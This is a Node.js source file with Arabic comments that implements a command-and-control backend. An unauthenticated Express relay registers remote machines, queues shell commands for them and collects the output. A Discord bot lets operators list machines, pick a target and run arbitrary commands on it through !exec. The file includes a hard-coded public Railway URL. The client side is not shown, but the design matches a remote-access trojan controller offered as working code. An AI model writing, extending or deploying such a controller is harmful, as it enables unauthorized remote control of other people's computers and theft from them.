const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const { exec, execSync } = require('child_process');
const os = require('os');

// ===== قراءة التوكن من البيئة =====
const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) {
    console.error('❌ BOT_TOKEN غير مضبوط في متغيرات البيئة.');
    process.exit(1);
}

const PREFIX = '!';
const PORT = process.env.PORT || 3000;

// ===== خادم Express الوسيط =====
const app = express();
app.use(bodyParser.json());

const pendingCommands = {};      // { clientId: [ { id, cmd } ] }
const commandResults = {};
let cmdCounter = 0;
const clients = {};              // { clientId: { hostname, lastSeen } }

// تسجيل العميل
app.post('/register', (req, res) => {
    const { clientId, hostname } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
    clients[clientId] = { hostname: hostname || 'Unknown', lastSeen: Date.now() };
    console.log(`📥 عميل جديد: ${clientId} (${hostname})`);
    res.json({ status: 'registered' });
});

// استطلاع الأوامر المعلقة
app.get('/poll/:clientId', (req, res) => {
    const clientId = req.params.clientId;
    if (clients[clientId]) clients[clientId].lastSeen = Date.now();
    const list = pendingCommands[clientId] || [];
    if (list.length === 0) return res.status(204).send();
    const cmdObj = list.shift();
    res.json({ id: cmdObj.id, command: cmdObj.cmd });
});

// استلام نتيجة تنفيذ أمر
app.post('/result', (req, res) => {
    const { id, result } = req.body;
    commandResults[id] = result;
    res.json({ status: 'ok' });
});

// إرسال أمر من البوت إلى عميل معين
app.post('/send', (req, res) => {
    const { clientId, command } = req.body;
    if (!clientId || !command) return res.status(400).json({ error: 'Missing data' });
    const id = ++cmdCounter;
    if (!pendingCommands[clientId]) pendingCommands[clientId] = [];
    pendingCommands[clientId].push({ id, cmd: command });
    res.json({ status: 'queued', id });
});

// جلب نتيجة أمر سابق
app.get('/result/:id', (req, res) => {
    const result = commandResults[req.params.id];
    if (result) res.json({ result });
    else res.status(404).json({ error: 'Not found' });
});

// قائمة الأجهزة المتصلة
app.get('/clients', (req, res) => {
    const now = Date.now();
    const online = {};
    for (const [id, data] of Object.entries(clients)) {
        if (now - data.lastSeen < 30000) online[id] = data;
    }
    res.json(online);
});

// ===== بوت ديسكورد =====
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const userTargets = new Map();   // userId -> targetClientId

client.on('messageCreate', async (msg) => {
    if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
    const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

    // الاتصال الداخلي بالخادم الوسيط (نفس الحاوية)
    const baseUrl = `http://127.0.0.1:${PORT}`;

    // عرض الأجهزة المتصلة
    if (cmd === 'list') {
        try {
            const res = await fetch(`${baseUrl}/clients`);
            const data = await res.json();
            const entries = Object.entries(data);
            if (entries.length === 0) return msg.reply('❌ لا توجد أجهزة متصلة حالياً.');
            let listMsg = '📡 الأجهزة المتصلة:\n';
            entries.forEach(([id, info]) => {
                listMsg += `🖥️ \`${id}\` (${info.hostname}) - آخر اتصال: ${new Date(info.lastSeen).toLocaleTimeString()}\n`;
            });
            listMsg += '\nاستخدم `!use <المعرف>` لتحديد جهاز، ثم `!exec <أمر>`.';
            await msg.reply(listMsg);
        } catch (err) {
            await msg.reply(`❌ خطأ في جلب الأجهزة: ${err.message}`);
        }
        return;
    }

    // اختيار هدف
    if (cmd === 'use') {
        const targetId = args[0];
        if (!targetId) return msg.reply('⚠️ اكتب: `!use <المعرف>`');
        try {
            const res = await fetch(`${baseUrl}/clients`);
            const data = await res.json();
            if (!data[targetId]) return msg.reply(`❌ المعرف غير موجود. استخدم \`!list\``);
            userTargets.set(msg.author.id, targetId);
            await msg.reply(`✅ تم اختيار \`${targetId}\` (${data[targetId].hostname}).`);
        } catch (err) {
            await msg.reply(`❌ خطأ: ${err.message}`);
        }
        return;
    }

    // تنفيذ أمر على الهدف المختار
    if (cmd === 'exec') {
        const targetId = userTargets.get(msg.author.id);
        if (!targetId) return msg.reply('⚠️ اختر جهازاً أولاً بـ `!use <id>`.');
        const fullCmd = args.join(' ');
        if (!fullCmd) return msg.reply('اكتب الأمر (مثال: `!exec dir C:\\`)');
        try {
            const sendRes = await fetch(`${baseUrl}/send`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientId: targetId, command: fullCmd })
            });
            const data = await sendRes.json();
            await msg.reply(`✅ تم إرسال الأمر. المعرف: \`${data.id}\``);
            await new Promise(r => setTimeout(r, 5000));
            const resultRes = await fetch(`${baseUrl}/result/${data.id}`);
            if (resultRes.ok) {
                const json = await resultRes.json();
                await msg.reply(`📦 **النتيجة:**\n\`\`\`\n${json.result.slice(0, 1900)}\n\`\`\``);
            } else {
                await msg.reply(`⏳ لم تصل النتيجة بعد. استخدم \`!result ${data.id}\` لاحقاً.`);
            }
        } catch (err) {
            await msg.reply(`❌ فشل: ${err.message}`);
        }
        return;
    }

    // جلب نتيجة محددة
    if (cmd === 'result') {
        const id = args[0];
        if (!id) return msg.reply('اكتب: `!result <id>`');
        try {
            const res = await fetch(`${baseUrl}/result/${id}`);
            if (res.ok) {
                const json = await res.json();
                await msg.reply(`📦 **النتيجة:**\n\`\`\`\n${json.result.slice(0, 1900)}\n\`\`\``);
            } else {
                await msg.reply('❌ لم يتم العثور على النتيجة.');
            }
        } catch (err) { await msg.reply('خطأ في الاستعلام'); }
        return;
    }

    // أوامر مساعدة
    if (cmd === 'ping') return msg.reply(`Pong! ${client.ws.ping}ms`);
    if (cmd === 'help') {
        return msg.reply(`📋 **الأوامر المتاحة:**\n\`!list\` – عرض الأجهزة\n\`!use <id>\` – اختيار جهاز\n\`!exec <أمر>\` – تنفيذ أمر\n\`!result <id>\` – جلب نتيجة سابقة\n\`!ping\` – اختبار الاتصال`);
    }
});

// حدث جاهزية البوت (استخدم clientReady لتجنب تحذير الإهمال)
client.once('clientReady', () => {
    console.log(`✅ البوت يعمل باسم ${client.user.tag}`);
});

// تسجيل الدخول
client.login(TOKEN).catch(err => {
    console.error('❌ فشل تسجيل الدخول:', err);
    process.exit(1);
});

// تشغيل خادم Express
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ الخادم الوسيط يعمل على المنفذ ${PORT}`);
    console.log(`🌐 الرابط العام: https://remote-production-b44f.up.railway.app`); // غيّر هذا حسب رابطك
});

// معالجة الأخطاء غير المتوقعة لمنع إيقاف الحاوية
process.on('uncaughtException', (err) => {
    console.error('⚠️ استثناء غير معالج:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ رفض غير معالج:', reason);
});
